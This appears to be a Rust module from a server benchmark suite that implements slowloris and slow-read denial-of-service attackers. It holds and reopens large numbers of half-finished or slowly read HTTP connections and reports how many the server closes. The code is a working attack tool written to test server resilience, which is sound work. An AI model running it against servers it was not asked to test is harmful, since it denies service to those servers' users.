//! S10's attackers: slowloris and slow-read connections, run next to a measured load.
//!
//! - **slowloris**: each connection sends the start of a request head, then one more header
//!   line per interval, and never finishes the head. A server that holds such connections
//!   forever keeps a slot (and memory) per attacker; one with a header timeout closes them.
//! - **slow read**: each connection pipelines 16 requests for a large resource, then reads
//!   1 KB a second, so the server must hold the replies or block on the socket.
//!
//! Connections the server closes are reopened (so the pressure stays constant) and counted.
//! One thread drives every socket, non-blocking; connects run on a small thread pool.

use std::io::{ErrorKind, Read, Write};
use std::net::{SocketAddr, TcpStream};
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{mpsc, Arc};
use std::time::{Duration, Instant};

#[derive(Clone, Copy, PartialEq, Eq)]
enum Kind {
    Loris,
    Reader,
}

struct Att {
    s: TcpStream,
    kind: Kind,
    lines: u64,
    opened: Instant,
}

fn open(addr: SocketAddr) -> Option<TcpStream> {
    let s = TcpStream::connect_timeout(&addr, Duration::from_secs(3)).ok()?;
    let _ = s.set_nodelay(true);
    s.set_nonblocking(true).ok()?;
    Some(s)
}

fn first_bytes(kind: Kind, host: &str, path: &str) -> Vec<u8> {
    match kind {
        Kind::Loris => format!("GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: simoom-bench-slowloris\r\n").into_bytes(),
        Kind::Reader => {
            let one = format!("GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: simoom-bench-slowread\r\n\r\n");
            one.repeat(16).into_bytes()
        }
    }
}

#[allow(clippy::too_many_arguments)]
pub fn run(addr: SocketAddr, host: &str, slowloris: usize, slowread: usize, path: &str, interval: Duration, duration: Duration, label: &str) -> Result<(), String> {
    let total = slowloris + slowread;
    if total == 0 {
        return Err("attack: give --slowloris N and/or --slowread N".into());
    }
    let host = if host.is_empty() { addr.to_string() } else { host.to_string() };
    // open in parallel
    let next = Arc::new(AtomicUsize::new(0));
    let (tx, rx) = mpsc::channel::<(Kind, TcpStream)>();
    let mut joins = Vec::new();
    for _ in 0..32.min(total) {
        let (next, tx) = (next.clone(), tx.clone());
        joins.push(std::thread::spawn(move || loop {
            let k = next.fetch_add(1, Ordering::Relaxed);
            if k >= total {
                break;
            }
            let kind = if k < slowloris { Kind::Loris } else { Kind::Reader };
            if let Some(s) = open(addr) {
                let _ = tx.send((kind, s));
            }
        }));
    }
    drop(tx);
    for j in joins {
        let _ = j.join();
    }
    let start = Instant::now();
    let mut atts: Vec<Att> = Vec::with_capacity(total);
    for (kind, mut s) in rx {
        let _ = s.write_all(&first_bytes(kind, &host, path));
        atts.push(Att { s, kind, lines: 0, opened: Instant::now() });
    }
    eprintln!("attack: {} of {total} connections open in {:.1} s", atts.len(), start.elapsed().as_secs_f64());
    let opened_at_start = atts.len();
    let (mut loris_closed, mut reader_closed, mut reopen_failed) = (0u64, 0u64, 0u64);
    let mut bytes_read = 0u64;
    let mut longest_loris = Duration::ZERO;
    let tick = Duration::from_millis(100);
    let ticks_per_interval = (interval.as_millis() / tick.as_millis()).max(1) as usize;
    let end = Instant::now() + duration;
    let mut t = 0usize;
    let mut last_status = Instant::now();
    let mut buf = vec![0u8; 1024];
    let mut missing_loris = slowloris.saturating_sub(atts.iter().filter(|a| a.kind == Kind::Loris).count());
    let mut missing_reader = slowread.saturating_sub(atts.iter().filter(|a| a.kind == Kind::Reader).count());
    while Instant::now() < end {
        let turn = Instant::now();
        let mut i = 0;
        while i < atts.len() {
            let a = &mut atts[i];
            let mut closed = false;
            match a.kind {
                Kind::Loris => {
                    // is it still open? (a server may answer 408/400 and close)
                    match a.s.read(&mut buf) {
                        Ok(0) => closed = true,
                        Ok(_) => {}
                        Err(e) if e.kind() == ErrorKind::WouldBlock => {}
                        Err(_) => closed = true,
                    }
                    if !closed && i % ticks_per_interval == t % ticks_per_interval {
                        a.lines += 1;
                        let line = format!("X-Slow-{}: {}\r\n", a.lines, a.lines);
                        match a.s.write(line.as_bytes()) {
                            Ok(_) => {}
                            Err(e) if e.kind() == ErrorKind::WouldBlock => {}
                            Err(_) => closed = true,
                        }
                    }
                }
                Kind::Reader => {
                    // 1 KB a second: one read every 10 ticks, staggered
                    if i % 10 == t % 10 {
                        match a.s.read(&mut buf) {
                            Ok(0) => closed = true,
                            Ok(n) => bytes_read += n as u64,
                            Err(e) if e.kind() == ErrorKind::WouldBlock => {}
                            Err(_) => closed = true,
                        }
                    }
                }
            }
            if closed {
                let a = atts.swap_remove(i);
                match a.kind {
                    Kind::Loris => {
                        loris_closed += 1;
                        longest_loris = longest_loris.max(a.opened.elapsed());
                        missing_loris += 1;
                    }
                    Kind::Reader => {
                        reader_closed += 1;
                        missing_reader += 1;
                    }
                }
                continue;
            }
            i += 1;
        }
        // reopen what the server closed, a bounded number per tick so the loop keeps its pace
        let mut budget = 200;
        while budget > 0 && (missing_loris > 0 || missing_reader > 0) {
            let kind = if missing_loris > 0 { Kind::Loris } else { Kind::Reader };
            budget -= 1;
            match open(addr) {
                Some(mut s) => {
                    let _ = s.write_all(&first_bytes(kind, &host, path));
                    atts.push(Att { s, kind, lines: 0, opened: Instant::now() });
                    if kind == Kind::Loris {
                        missing_loris -= 1;
                    } else {
                        missing_reader -= 1;
                    }
                }
                None => {
                    reopen_failed += 1;
                    break;
                }
            }
        }
        if last_status.elapsed() >= Duration::from_secs(10) {
            last_status = Instant::now();
            eprintln!(
                "attack: {:.0} s: open {} (slowloris {}, slow read {}), closed by the server: slowloris {loris_closed}, slow read {reader_closed}",
                start.elapsed().as_secs_f64(),
                atts.len(),
                atts.iter().filter(|a| a.kind == Kind::Loris).count(),
                atts.iter().filter(|a| a.kind == Kind::Reader).count()
            );
        }
        t += 1;
        let spent = turn.elapsed();
        if spent < tick {
            std::thread::sleep(tick - spent);
        }
    }
    let loris_open = atts.iter().filter(|a| a.kind == Kind::Loris).count();
    let reader_open = atts.iter().filter(|a| a.kind == Kind::Reader).count();
    println!(
        "ATTACK {}slowloris={slowloris} slowread={slowread} opened={opened_at_start} slowloris_open_end={loris_open} slowread_open_end={reader_open} slowloris_closed_by_server={loris_closed} slowread_closed_by_server={reader_closed} reopen_failed={reopen_failed} slowread_bytes={bytes_read} longest_closed_loris_s={:.1} duration_s={:.0}",
        if label.is_empty() { String::new() } else { format!("{label} ") },
        longest_loris.as_secs_f64(),
        duration.as_secs_f64()
    );
    Ok(())
}
